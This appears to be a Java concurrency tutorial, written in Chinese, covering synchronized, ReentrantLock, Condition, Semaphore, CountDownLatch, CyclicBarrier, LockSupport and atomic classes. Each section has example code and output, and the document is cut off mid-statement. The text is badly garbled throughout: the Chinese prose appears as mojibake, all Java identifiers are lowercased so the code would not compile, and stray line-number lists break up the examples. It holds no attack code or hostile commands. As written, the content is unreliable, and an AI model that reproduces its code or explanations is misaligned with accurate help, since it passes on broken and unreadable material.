å»ç³æä¸ä¸ªåéæ¶ï¼å°±ç­äºåè¯äºèææºï¼è¿ä¸ªåéææå¯è½ä¼è¢«æäºç¨åºæèçº¿ç¨ä¿®æ¹ãä¸ºäºç¡®ä¿è¿ä¸ªåéè¢«ä¿®æ¹åï¼åºç¨ç¨åºèå´åçææçº¿ç¨é½è½å¤ "çå°" è¿ä¸ªæ¹å¨ï¼èææºå°±å¿é¡»éç¨ä¸äºç¹æ®çææ®µï¼ä¿è¯è¿ä¸ªåéçå¯è§æ§ãæåºæ§ãåå­æ§ã\nââ volatile å¯¹äºä¿è¯æä½çåå­æ§æ¯æéå¸¸å¤§çå¸®å©çãä½æ¯éè¦æ³¨æçæ¯ï¼volatile å¹¶ä¸è½ä»£æ¿éï¼ä»ä¹æ æ³ä¿è¯ä¸äºå¤åæä½çåå­æ§ãæ¯å¦ i++\n\n\n# åãsynchronized\n\nâ â synchronized çä½ç¨æ¯å®ç°çº¿ç¨é´çåæ­¥ãå®çå·¥ä½æ¯å¯¹åæ­¥çä»£ç å éï¼ä½¿å¾æ¯ä¸æ¬¡åªè½æä¸ä¸ªçº¿ç¨è¿å¥åæ­¥åï¼ä»èä¿è¯çº¿ç¨é´çå®å¨æ§ã\n\n * æå®å éå¯¹è±¡ï¼å¯¹ç»å®çå¯¹è±¡å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾ç»å®å¯¹è±¡çéï¼ä¸è¦ä¿è¯æ¯ä¸ªçº¿ç¨éç synchronized (å¯¹è±¡) çå¯¹è±¡åæ°æ¯åä¸ä¸ªå®ä¾ã\n * ç´æ¥ä½ç¨äºå®ä¾æ¹æ³ï¼ç¸å½äºå¯¹å½åå®ä¾å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾å½åå®ä¾çéãè¥ä¸¤ä¸ªçº¿ç¨ä¸æ¯åä¸ä¸ªå®ä¾ï¼åéå¤±è´¥ã\n * ç´æ¥ä½ç¨äºéææ¹æ³ï¼ç¸å½äºå¯¹å½åç±»å éï¼è¿å¥åæ­¥ä»£ç åè¦è·å¾å½åç±»çéã\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = "aaa";\n        string b = "aaa";\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n200000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = "aaa";\n        string b = "bbb";\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n112775\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = new string("aaa");\n        string b = new string("aaa");\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n        system.out.println(a);\n        system.out.println(b);\n    }\n    public static void add(){\n        i++;\n    }\nç»æï¼\n106451\naaa\naaa\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# åãreentrantlock éå¥é\n\nââå½çº¿ç¨è¯·æ±ä¸ä¸ªç±å¶å®çº¿ç¨ææçå¯¹è±¡éæ¶ï¼è¯¥çº¿ç¨ä¼é»å¡ï¼èå½çº¿ç¨è¯·æ±ç±èªå·±ææçå¯¹è±¡éæ¶ï¼å¦æè¯¥éæ¯éå¥éï¼è¯·æ±å°±ä¼æåï¼å¦åé»å¡ãç¹å«æ³¨æï¼è¥ä¸ä¸ªçº¿ç¨å¤æ¬¡è·å¾éï¼é£ä¹å¨éæ¾æå¾æ¶åï¼ä¹å¿é¡»éæ¾ç¸åæ¬¡æ°ã\nââ synchronized ä¹æ¯éå¥éï¼å½ä¸ä¸ªç±»éç aãbãc ä¸ä¸ªæ¹æ³é½è¢«å ä¸ synchronized å a è°ç¨ bï¼b è°ç¨ c ä¼ä¾æ¬¡æ­£ç¡®è°ç¨æ§è¡ï¼å¦æ synchronized ä¸æ¯éå¥éï¼åè¿ç§è°ç¨æ¹å¼ä¼è¢« æä¸ºæ­»éï¼å ä¸º a b c ä¸ä¸ªæ¹æ³ææçæ¯åä¸ä¸ªå®ä¾ã\n\n\n# reentrantlock.lockinterruptibly () ä¸­æ­å¤ç\n\nââ å¨ç­å¾éçè¿ç¨ä¸­ï¼ç¨åºå¯ä»¥æ ¹æ®éè¦åæ¶å¯¹éçç³è¯·ãlockinterruptibly () å¯¹ä¸­æ­è¿è¡ååºçéç³è¯·å¨ä½ï¼å³å¨ç­å¾éçè¿ç¨ä¸­ï¼å¯ä»¥ååºä¸­æ­ã\n\n\n# reentrantlock.trylock () éç³è¯·ç­å¾éæ¶\n\nââ trylock () æä¸¤ç§æ¹æ³\n\n * reentrantlock.trylock (5, timeunit.seconds); å¦æéè¢«å¶ä»çº¿ç¨å ç¨åç­å¾ 5 ç§ï¼è¶è¿ 5 ç§æ²¡æå¾å°éï¼å°±ä¼è¿å falseï¼æåå¾å°éåè¿å trueã\n * reentrantlock.trylock (); å¦æéè¢«å¶ä»çº¿ç¨å ç¨åç´æ¥è¿å falseï¼å¾å°éåç´æ¥è¿å true\n\n\n# reentrantlock (true) å¬å¹³é\n\nââ å¨å¤§å¤æåµä¸éé½æ¯éå¬å¹³çãä¹å°±æ¯è¯´ï¼çº¿ç¨ 1 å çº¿ç¨ 2 åæ¶è¯·æ±äºé aï¼é£ä¹å½é a å¯ç¨æ¶ï¼æ¯çº¿ç¨ 1 å¯ä»¥è·å¾éè¿æ¯çº¿ç¨ 2 å¯ä»¥è·å¾éå¢ï¼è¿æ¯ä¸ä¸å®çï¼ç³»ç»åªæ¯ä¼ä»è¿ä¸ªéçç­å¾éåç§éæºæéä¸ä¸ªã\nââ å½ new reentrantlock (true) è¡¨ç¤ºæ¯å¬å¹³çãä½è¦å®ç°ä¸ä¸ªå¬å¹³éï¼å¿ç¶è¦æ±ç³»ç»ç»´æ¤ä¸ä¸ªæåºéåï¼å æ­¤å¬å¹³éçå®ç°ææ¬æ¯è¾é«äºï¼å¦ææ²¡æç¹å«çéè¦ï¼ä¹ä¸éè¦ä½¿ç¨å¬å¹³éã\n\n> reentrantlock.lock (); è·å¾éï¼å¦æéè¢«å ç¨åç­å¾ï¼\n> reentrantlock.trylock (); çº¿ç¨å°è¯è·åéï¼å¦æè·åæåï¼åè¿å trueï¼å¦æè·åå¤±è´¥ï¼å³éå·²è¢«å¶ä»çº¿ç¨è·åï¼ï¼åè¿å false\n> reentrantlock.trylock (long timeoutï¼timeunit unit); çº¿ç¨å¦æå¨æå®ç­å¾æ¶é´åè·å¾äºéï¼å°±è¿å trueï¼å¦åè¿å false\n> reentrantlock.unlock (); éæ¾é\n> reentrantlock.isheldbycurrentthread () å½åçº¿ç¨æ¯å¦ææè¯¥é\n> reentrantlock.lockinterruptibly () è·å¾éï¼ä½æçº¿ååºä¸­æ­\n> reentrantlock.getholdcount (); å½åçº¿ç¨è°ç¨ lock () æ¹æ³çæ¬¡æ°\n> reentrantlock.getqueuelength (); å½åæ­£å¨ç­å¾è·å lock éççº¿ç¨çä¼°è®¡æ°\n> reentrantlock.getwaitqueuelength (condition condition); å½åæ­£å¨ç­å¾ç¶æççº¿ç¨çä¼°è®¡æ°ï¼éè¦ä¼ å¥ condition å¯¹è±¡\n> reentrantlock.haswaiters (condition condition); æ¥è¯¢æ¯å¦æçº¿ç¨æ­£å¨ç­å¾ä¸ lock éæå³ç condition æ¡ä»¶\n> reentrantlock.hasqueuedthread (thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å lock é\n> reentrantlock.hasqueuedthreads (); æ¥è¯¢æ¯å¦æçº¿ç¨æ­£å¨ç­å¾è·åæ­¤éå®\n> reentrantlock.isfair (); å¤æ­å½å lock éæ¯ä¸æ¯å¬å¹³é\n> reentrantlock.hasqueuedthread (thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å lock é\n> reentrantlock.hasqueuedthread (thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å lock é\n> reentrantlock.hasqueuedthread (thread thread); æ¥è¯¢æå®ççº¿ç¨æ¯å¦æ­£å¨ç­å¾è·å lock é\n\n\n# condition æ¡ä»¶\n\n    public static void main(string[] args) throws interruptedexception {\n        reentrantlock lock = new reentrantlock();\n        condition condition = lock.newcondition();\n        new thread(() -> {\n            try{\n                system.out.println("è¿å¥æµè¯");\n                lock.lock();\n                system.out.println("è·åé");\n                condition.await();\n                system.out.println("ç­å¾ç»æ");\n                thread.sleep(5000);\n                system.out.println("è¿æ¯å¯¹æçä¸æ¬¡æµè¯");\n            }catch(exception e){\n                lock.unlock();\n            }\n        }).start();\n        thread.sleep(3000);\n        system.out.println("ç­å¾ä¸ç§ç»æ");\n        lock.lock();\n        condition.signal();\n        lock.unlock();\n    }\nç»æï¼\nè¿å¥æµè¯\nè·åé\nç­å¾ä¸ç§ç»æ\nç­å¾ç»æ\nè¿æ¯å¯¹æçä¸æ¬¡æµè¯\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nââ å object é waite () notify () ä¸æ ·ï¼å½çº¿ç¨ä½¿ç¨ condition.await () æ¶ï¼è¦æ±çº¿ç¨ææç¸å³çéå¥éï¼å¨ condition.await () è°ç¨åï¼è¿ä¸ªçº¿ç¨ä¼éæ¾è¿æéãåçï¼å¨ condition.signal () æ¹æ³è°ç¨æ¶ï¼ä¹è¦æ±çº¿ç¨åè·å¾ç¸å³éï¼å¨ condition.signal () æ¹æ³è°ç¨åï¼ç³»ç»ä¼ä»å½å condition å¯¹è±¡çç­å¾éåä¸­ï¼å¤éä¸ä¸ªçº¿ç¨ï¼ä¸æ¦çº¿ç¨å¤éï¼å®ä¼éæ°å°è¯è·å¾ä¸ä¹ç»å®çéå¥éï¼ä¸æ¦æåè·åï¼å°±å¯ä»¥ç»§ç»­æ§è¡ãå æ­¤ï¼å¨ condition.signal () æ¹æ³è°ç¨åï¼ä¸è¬éè¦éæ¾ç¸å³çéï¼è®©ç»è¢«å¤éççº¿ç¨ï¼è®©å®ç»§ç»­æ§è¡ã\n\n\n# äºãä¿¡å·é semaphore\n\nââ ä¿¡å·éä¸ºå¤çº¿ç¨åä½æä¾æ´ä¸ºå¼ºå¤§çæ§å¶æ¹æ³ãå¹¿ä¹ä¸è®²ï¼ä¿¡å·éæ¯å¯¹éçæ©å±ãæ è®ºæ¯åé¨ synchronized è¿æ¯ reentrantlockï¼ä¸æ¬¡é½åªåè®¸ä¸ä¸ªçº¿ç¨è®¿é®ä¸ä¸ªèµæºï¼èä¿¡å·éå´å¯ä»¥æå®å¤ä¸ªçº¿ç¨ï¼åæ¶è®¿é®æ¸ä¸ä¸ªèµæºãå¨æé ä¿¡å·éå¯¹è±¡æ¶ï¼å¿é¡»è¦æå®ä¿¡å·éçåå¥æ°ï¼å³åæ¶è½ç³è¯·å¤å°ä¸ªè®¸å¯ã\n\nsemaphore semaphore = new semaphore(3);\nsemaphore semaphore1 = new semaphore(3,true); // ç¬¬äºä¸ªåæ°æå®æ¯å¦å¬å¹³\n\n\n1\n2\n\n * acquire () å°è¯è·å¾ä¸ä¸ªåå¥è®¸å¯ãè¥æ æ³è·å¾ï¼åçº¿ç¨ä¼ç­å¾ï¼ç´å°æçº¿ç¨éæ¾ä¸ä¸ªè®¸å¯æèå½åçº¿ç¨è¢«ä¸­æ­ã\n * acquireuninterruptibly () å acquire () ç±»ä¼¼ï¼ä½ä¸ä¼ååºä¸­æ­ã\n * tryacquire () å°è¯è·å¾ä¸ä¸ªè®¸å¯ï¼æåè¿å trueï¼å¤±è´¥è¿å falseã\n * release () å¨çº¿ç¨è®¿é®èµæºç»æåï¼éæ¾ä¸ä¸ªè®¸å¯ï¼ä»¥ä½¿å¶ä»ç­å¾è®¸å¯ççº¿ç¨å¯ä»¥è¿è¡èµæºè®¿é®ã\n\n    public static void main(string[] args) throws interruptedexception {\n        semaphore semaphore = new semaphore(3);\n        for(int i=0;i<20;i++){\n            new thread(() -> {\n                try {\n                    semaphore.acquire();\n                    thread.sleep(2000);\n                    system.out.println("ç»æ -> "+ thread.currentthread().getid());\n                    semaphore.release();\n                }catch (exception e){\n\n                }\n            }).start();\n        }\n    }\nç»æï¼\nç»æ -> 13\nç»æ -> 14\nç»æ -> 12\nç»æ -> 15\n...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# å­ãreetrantreadwritelock è¯»åé\n\nââ reetrantreadwritelock å®ç°äº readwritelock æ¥å£ï¼readwritelock ç®¡çä¸ç»éï¼ä¸ä¸ªæ¯åªè¯»çéï¼ä¸ä¸ªæ¯åéã\n\n * reetrantreadwritelock æ¯æè·åéé¡ºåºï¼éå¬å¹³æ¨¡å¼ï¼é»è®¤ï¼ï¼å¬å¹³æ¨¡å¼\n * reetrantreadwritelock æ¯æå¯éå¥\n * reetrantreadwritelock æ¯æééçº§ï¼å¯ä»¥ä»åééçº§å°è¯»éï¼ä½ä¸è½ä»è¯»éåçº§å°åéã\n\n\n# ä¸ãcountdownlatch åè®¡æ¶å¨\n\n    public static void main(string[] args) throws interruptedexception {\n        countdownlatch countdownlatch = new countdownlatch(10);\n        for(int i = 0;i<5;i++){\n            int b = i;\n            new thread(() -> {\n                system.out.println("i å·²åå¤ = "+ b);\n                countdownlatch.countdown();\n            }).start();\n        }\n        // ç­å¾è£è½½å®æ¯\n        countdownlatch.await();\n        system.out.println("ç»æ");\n    }\nç»æ:\ni å·²åå¤ = 0\ni å·²åå¤ = 1\ni å·²åå¤ = 2\ni å·²åå¤ = 3\ni å·²åå¤ = 4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nââ ä¸ºä»ä¹æ²¡æè¾åº "ç»æ"ï¼æ¯å ä¸ºæä»¬ç» countdownlatch çä»»å¡ä¸º 10 ä¸ªï¼ä½æ¯å¾ªç¯åªæ 5 ä¸ªä»»å¡ï¼æä»¥å¨ countdownlatch.await (); ä¼ä¸ç´ç­å¾è£è½½å¤æä¼ç»§ç»­æ§è¡ï¼æä»¥é»å¡å¨é£éãå¦æå¾ªç¯å¤§å°æ¯ countdownlatch çä»»å¡å¤§ï¼åä¸æ¦è£è½½å¤ï¼åä¼ç«é©¬ç»§ç»­æ§è¡ãcountdownlatch.countdown () åè¯ countdownlatch å®ä¾ï¼å·²è¿åå¤å¥½ä¸ä¸ªã\n\n   public static void main(string[] args) throws interruptedexception {\n        countdownlatch countdownlatch = new countdownlatch(10);\n        for(int i = 0;i<12;i++){\n            int b = i;\n            new thread(() -> {\n                countdownlatch.countdown();\n                try {\n                    thread.sleep(5000);\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                }\n                system.out.println("i å·²åå¤ = "+ b);\n            }).start();\n        }\n        // ç­å¾è£è½½å®æ¯\n        countdownlatch.await();\n        system.out.println("ç»æ");\n    }\nç»æï¼\nç»æ\ni å·²åå¤ = 0\ni å·²åå¤ = 11\ni å·²åå¤ = 6\ni å·²åå¤ = 1\ni å·²åå¤ = 8\ni å·²åå¤ = 5\ni å·²åå¤ = 9\ni å·²åå¤ = 2\ni å·²åå¤ = 3\ni å·²åå¤ = 10\ni å·²åå¤ = 4\ni å·²åå¤ = 7\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# å«ãcyclicbarrier å¾ªç¯æ æ \n\nââ è¿è´§æ¯ countdownlatch çé¼ä¸ç¹çå°±æ¯ï¼æéé½ 7 æ£µé¾ç ï¼è®¸äºæ¿ï¼è¿å¯ä»¥åç­éé½ 7 æ£µé¾ç ï¼åè®¸æ¿ãåªè¦æéé½ 1 é¢å°±å¿é¡»ç­ 7 æ£µå¨é¨éé½ï¼å¦åä¸ç´ç­å¾ãä½å¬å¤ç¥é¾ä¹æ¯ä¼æä¸éçï¼ä»ä¹æ¶åæè½å½»åºç»æå¢ï¼å°±æ¯ä½ å¨ cyclicbarrier æé å½æ°ä¼ å¥ 7ï¼ä¸æ¦éé½ 7 æ£µé£å°±ç»æäºã\n\n    public static void main(string[] args) throws interruptedexception {\n        int parties = 7;\n        cyclicbarrier cyclicbarrier = new cyclicbarrier(parties);\n        for(int i = 0;i<8;i++){\n            int b = i;\n            if(b%parties ==0) {\n                thread.sleep(2000);\n            }\n            new thread(() -> {\n                system.out.println("å·²éé½ "+ (b%parties +1));\n                try {\n                    cyclicbarrier.await();\n                    if(b%parties ==0) {\n                        system.out.println("å¬å¤ç¥é¾");\n                    }\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                } catch (brokenbarrierexception e) {\n                    e.printstacktrace();\n                }\n            }).start();\n        }\n    }\nç»è®ºæ¯ï¼\nå·²éé½ 1\nå·²éé½ 2\nå·²éé½ 3\nå·²éé½ 7\nå·²éé½ 5\nå·²éé½ 6\nå·²éé½ 4\nå¬å¤ç¥é¾\nå·²éé½ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nââ ä¸è¦å¨ä¹ä»¥ä¸ç»æçé¡ºåºï¼å¯ä»¥çå°å®å·²ç»éé½äº 7 æ£µé¾ç ï¼å¬å¤äºç¥é¾ï¼ä½æ¯å¬å¤å®äºä¹ååå¨å»éé½ï¼è¿æ ·å°±é æäºç­å¾ï¼å¿å¿è¦åæ¬¡éé½å¬å¤ç¥é¾ï¼ä¸å¬å¤äºä¹åä¸åå»éé½äºï¼æè½ç»æè¿ç¨ã\n\n\n# ä¹ãlocksupport çº¿ç¨é»å¡å·¥å·\n\nââ locksupport æ¯ä¸ä¸ªéå¸¸æ¹ä¾¿å®ç¨çº¿ç¨é»å¡å·¥å·ï¼å®å¯ä»¥å¨çº¿ç¨åä»»æä½ç½®è®©çº¿ç¨é»å¡ãå thread.suspend () ç¸æ¯ï¼å®å¼¥è¡¥äºç±äº resume () å¨ååçï¼å¯¼è´çº¿ç¨æ æ³ç»§ç»­æ§è¡çæåµãå object.wait () ç¸æ¯ï¼å®ä¸éè¦åè·å¾æä¸ªå¯¹è±¡éï¼ä¹ä¸ä¼æåº ä¸­æ­å¼å¸¸ï¼ä¸­æ­å¼å¸¸å¯ä»¥å¨çº¿ç¨ä¸­è·å thread.currentthread ().isinterrupted () æ¥å¾ç¥ã\n\n    public static void main(string[] args) throws interruptedexception {\n        string a = "1";\n        thread[] threads = new thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new thread(() -> {\n                try {\n                    system.out.println("çº¿ç¨å¯å¨ " + b);\n//                  æåä½¿ç¨è§£é\n                    locksupport.unpark(thread.currentthread());\n                    locksupport.park();\n                    thread.sleep(3000);\n                    system.out.println("æ§è¡å®æ¯ " + b);\n                } catch (exception e) {\n                    system.out.println("èå­è¢«ä¸­æ­äº " + b);\n                    // è¿éå¿é¡»å¨ä¸­æ­ä¸æ¬¡ï¼å¦å\n                    thread.currentthread().interrupt();\n                }\n            });\n        }\n        threads[0].start();\n//        locksupport.unpark(threads[0]);\n        threads[1].start();\n    }\nè¾åºç»æï¼\nçº¿ç¨å¯å¨ 0\næ§è¡å®æ¯ 0\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# åãæ é\n\nââ å¯¹äºå¹¶åæ§å¶èè¨ï¼éæ¯ä¸ç§æ²è§ç­ç¥ãå®æ»æ¯åè®¾æ¯ä¸æ¬¡çä¸´çåºæä½ä¼äº§çå²çªï¼å æ­¤ï¼å¿é¡»å¯¹æ¯æ¬¡æä½é½å°å¿ç¿¼ç¿¼ãå¦ææå¤ä¸ªçº¿ç¨åæ¶è®¿é®ä¸´çåºèµæºï¼å°±å®å¯çºç²è®©çº¿ç¨ç­å¾ï¼æä»¥è¯´éä¼é»å¡çº¿ç¨æ§è¡ãèæ éæ¯ä¸ç§ä¹è§çç­ç¥ï¼å®ä¼åè®¾å¯¹èµæºçè®¿é®æ²¡æå²çªçãæ¢ç¶æ²¡æå²çªï¼èªç¶ä¸éè¦ç­å¾ï¼æä»¥ææççº¿ç¨é½å¯ä»¥å¨ä¸åé¡¿çç¶æä¸æç»­æ§è¡ãé£éå°å²çªæä¹åï¼æ éçç­ç¥ä½¿ç¨ä¸ç§å«åæ¯è¾äº¤æ¢çææ¯ (cas compare and swap) æ¥é´å«çº¿ç¨å²çªï¼ä¸æ¦æ£æµå°å²çªäº§çï¼å°±éè¯å½åæä½ç´å°æ²¡æå²çªä½ç½®ã\nââ ä¸éç¸æ¯ï¼ä½¿ç¨æ¯è¾äº¤æ¢ (cas) ä¼ä½¿ç¨åºçèµ·æ¥æ´å å¤æä¸äºãä½ç±äºå¶éé»å¡æ§ï¼å®å¯¹æ­»éé®é¢å¤©çåç«ï¼å¹¶ä¸ï¼çº¿ç¨é´çç¸äºå½±åä¹è¿è¿æ¯åºäºéçæ¹å¼è¦å°ãæ´ä¸ºéè¦çæ¯ï¼ä½¿ç¨æ éçæ¹å¼å®å¨æ²¡æéç«äºå¸¦æ¥çç³»ç»å¼éï¼ä¹æ²¡æçº¿ç¨é´é¢ç¹è°åº¦å¸¦æ¥çå¼éï¼å æ­¤ï¼å®è¦æ¯åºäºéçæ¹å¼æ¥ææ´ä¼è¶çæ§è½ã\nââ cas çç®æ³è¿ç¨æ¯è¿æ ·çï¼å®åå«ä¸ä¸ªåæ° cas (v,e,n)ãv è¡¨ç¤ºè¦æ´æ°çåéï¼e è¡¨ç¤ºé¢æå¼ï¼n è¡¨ç¤ºæ°å¼ãä»å½ v å¼ç­äº e å¼æ¶ï¼æä¼å° v çå¼è®¾ä¸º nï¼å¦æ v å¼å e å¼ä¸åï¼åè¯´æå·²ç»æå¶ä»çº¿ç¨åäºæ´æ°ï¼åå½åçº¿ç¨ä»ä¹é½ä¸åãæåï¼cas è¿åå½å v ççå®å¼ãcas æä½æ¶æ±çä¹è§çæåº¦è¿è¡ï¼ä»æ»æ¯è®¤ä¸ºèªå·±å¯ä»¥å®ææä½ãå½å¤ä¸ªçº¿ç¨åæ¶ä½¿ç¨ cas æä½ä¸ä¸ªåéæ¶ï¼åªæä¸ä¸ªä¼èåºï¼å¹¶ä¸æåæ´æ°ï¼å¶ä½åä¼å¤±è´¥ãå¤±è´¥ççº¿ç¨ä¸ä¼è¢«æèµ·ï¼ä»æ¯è¢«åç¥å¤±è´¥ï¼å¹¶ä¸åè®¸åæ¬¡å°è¯ï¼å½ç¶ä¹åè®¸å¤±è´¥ççº¿ç¨æ¾å¼æä½ãåºäºè¿æ ·çåçï¼cas æä½å³ä½¿æ²¡æéï¼ä¹å¯ä»¥åç°å¶ä»çº¿ç¨å¯¹å½åçº¿ç¨çå¹²æ°ï¼å¹¶è¿è¡æ°å½çå¤çã\n\n\n# atomicinteger æ éçç³»ç»å®å¨æ´æ°\n\n    public static void main(string[] args) throws interruptedexception {\n        atomicinteger atomicinteger = new atomicinteger(0);\n        for(int i=0;i<100;i++){\n            new thread(() -> {\n                for(int j=0;j<100;j++){\n                    if(atomicinteger.incrementandget() == 100){\n                        system.out.println("å§æ§½");\n                    }\n                }\n            }).start();\n        }\n        thread.sleep(4000);\n        system.out.println(atomicinteger.get());\n    }\nè¾åºç»æï¼\nå§æ§½\n10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * get () åå¾å½åå¼\n * set (int newvalue) è®¾ç½®å½åå¼\n * getandset (int newvalue) è®¾ç½®æ°å¼ï¼å¹¶è¿åæ§å¼\n * compareandset (int expect, int update) å¦æå½åå¼ä¸º expect (ææ)ï¼åè®¾ç½®ä¸º update (æ°)\n * getandincrement () å½åå¼ + 1ï¼è¿åæ§å¼\n * getanddecrement () å½åå¼ - 1ï¼è¿åæ§å¼\n * getandadd (int delta) å½åå¼ + deltaï¼è¿åæ§å¼\n * addandget (int delta) å½åå¼ + deltaï¼è¿åæ°å¼\n * incrementandget () å½åå¼ + 1ï¼è¿åæ°å¼\n * decrementandget () å½åå¼ - 1ï¼è¿åæ°å¼\n\n\n# atomicreference æ éå¯¹è±¡å¼ç¨ å atomicstampedreference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨\n\nââ atomicreference å atomicinteger éå¸¸ç±»ä¼¼ï¼ä¸åä¹å¤å°±å¨äº atomicinteger æ¯å¯¹æ´æ°çå°è£ï¼è atomicreference åå¯¹åºæ®éçå¯¹è±¡å¼ç¨ãä¹å°±æ¯å®å¯ä»¥ä¿è¯ä½ å¨ä¿®æ¹å¯¹è±¡å¼ç¨æ¶ççº¿ç¨å®å¨æ§ã\n\n@data\n@accessors(chain = true)\nclass account{\n    private integer amount = 0;\n}\n\npublic static void main(string[] args) throws interruptedexception {\n    account account = new account();\n    account.setamount(10);\n    atomicreference<account> accountatomicreference = new atomicreference<account>();\n    accountatomicreference.set(account);\n    // æ¨¡æåå¼\n    for(int i=0;i<3;i++){\n        new thread(() -> {\n            account clientaccount = accountatomicreference.get();\n            system.out.println("åå¼åæ¥è¯¢è¶è¿æ "+ clientaccount.getamount());\n            if(clientaccount.getamount() < 20){\n                if(accountatomicreference.compareandset(clientaccount,clientaccount.setamount(clientaccount.getamount() + 20) )){\n                    system.out.println("ä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼"+ clientaccount.getamount());\n                }\n            }\n        }).start();\n    }\n}\nè¾åºç»æï¼\nåå¼åæ¥è¯¢è¶è¿æ 10\nåå¼åæ¥è¯¢è¶è¿æ 10\nåå¼åæ¥è¯¢è¶è¿æ 10\nä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nââ ä»¥ä¸åå­å¯ä»¥çå°ï¼å¤çº¿ç¨é´æä½åä¸ä¸ªå®ä¾å¯¹è±¡ï¼åªä¼æä¸ä¸ªæåãä½è¿ç§æ¨¡å¼å­å¨ä¸ä¸ª aba é®é¢ï¼å°±æ¯ï¼å¨çº¿ç¨æä½åï¼è¿ä¸ªå¼å¾å¯è½è¢«å¶ä»çº¿ç¨ç¨å»åå¶ä»çï¼å¯¼è´å¼è¢«ä½¿ç¨ååæ¢åæ¥ï¼å½åçº¿ç¨ä¸æ¥çå¼æ²¡é®é¢ç»§ç»­ä½¿ç¨ï¼é ææ°æ®è¢«åç¨ï¼æä»¬è¿å»å»çä¸ç¥éï¼è¿ä¹æ¯å®å¨æ§é®é¢ãä½è¿ç§æåµå°±éè¦çæä»¬çä¸å¡æ¯å¦éè¦è§£å³ã\nââ è§£å³åæ³å¢å°±æ¯ä½¿ç¨ atomicstampedreference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨ï¼ä¸å¶è¯´æ¶é´æ³ï¼æ´åæ¯ä¸ä¸ªä¿®æ¹æ è®°ï¼æ¯æ¬¡æ¶è´¹çæ¶åï¼æèåå¼çæ¶åæé½ç»ä¿®æ¹æ è®° + 1ï¼ä¸æ¦åæçåå§æ è®°ä¸ä¸æ ·ï¼æå°±ä¸è®©å¶ç»§ç»­åå¼ï¼åªè®©å¶æ¶è´¹ã\n\npublic static void main(string[] args) throws interruptedexception {\n    account account = new account();\n    account.setamount(10);\n    atomicstampedreference<account> accountatomicreference = new atomicstampedreference<account>(account,0);\n    // æ¨¡æåå¼\n    for(int i=0;i<3;i++){\n        int stamp = accountatomicreference.getstamp();\n        new thread(() -> {\n            while (true) {\n                account clientaccount = accountatomicreference.getreference();\n                system.out.println("åå¼åæ¥è¯¢ä½é¢è¿æ " + clientaccount.getamount());\n                if (clientaccount.getamount() < 20) {\n                    if (accountatomicreference.compareandset(clientaccount, clientaccount.setamount(clientaccount.getamount() + 